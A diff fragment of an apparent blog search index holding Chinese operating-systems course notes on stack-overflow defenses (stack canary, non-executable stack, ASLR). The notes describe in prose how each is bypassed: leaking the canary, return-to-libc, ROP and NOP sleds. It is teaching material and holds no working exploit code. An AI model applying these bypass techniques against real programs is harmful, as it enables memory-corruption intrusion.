-<p>119c 行的命令 <code>mov %fs:0x28, %rax</code> 将一个“奇妙”的数值存入 rax 寄存器，紧接着 11a5 行将这个值保存在了 <code>rbp - 8</code> 的位置，这便是金丝雀。在函数返回之前，11cd 行将金丝雀取出并在 11d1,11da 行对其值进行检查，如果不匹配则会在 11dc 行跳转到函数 __stack_chk_fail() 中。</p>
-<p>在打开 stack canary 的情况下，直接使用我们的 hack code，便会得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Program received signal SIGABRT, Aborted.</span><br></pre></td></tr></table></figure>
-
-<p>对抗金丝雀的技巧通常是利用一些读函数不遇到 <code>\0</code> 不停止的特性，把金丝雀的值泄漏出来，然后在进行栈溢出攻击的时候小心地处理金丝雀以骗过检查。</p>
-<h2 id="Non-executable-Stack"><a href="#Non-executable-Stack" class="headerlink" title="Non-executable Stack"></a>Non-executable Stack</h2><p>Linux 打开了 non-executable stack 用于防御栈溢出攻击。栈对应的页面的 NX bit 会被打开，表示栈上的数据不可执行。对于之前的 <code>vuln.c</code>，如果我们在编译时不加入 <code>-z execstack</code> 选项，则默认栈对应的页面都有 NX bit。此时直接使用我们的 hack code，会在跳转到 NOP sled 执行第一条 nop 指令时直接触发段错误。</p>
-<p>对抗 non-executable stack 的方法有 return-to-libc attack。攻击者将返回地址填写为 libc 库函数的地址，利用库函数语句来完成其攻击目的。在此基础上还有 ROP (return-oriented programming)，它不是利用完整的 libc 库函数，而是抓取多个靠近 <code>ret</code> 的零碎指令片段组合起来达到目的。</p>
-<h2 id="Address-Space-Layout-Randomization-ASLR"><a href="#Address-Space-Layout-Randomization-ASLR" class="headerlink" title="Address Space Layout Randomization (ASLR)"></a>Address Space Layout Randomization (ASLR)</h2><p>Linux 默认打开 ASLR，如果我们反复执行 <code>./vuln</code> ，会发现每次栈的位置都不一样，这使得我们无法准确判定需要攻击的地址。之前提到的 NOP sled 是一种可能的对抗 ASLR 的方法。</p>
-]]></content>
-      <categories>
-        <category>NJU-22020230 Operating Systems</category>
-        <category>Material</category>
       </categories>
   </entry>
 </search>
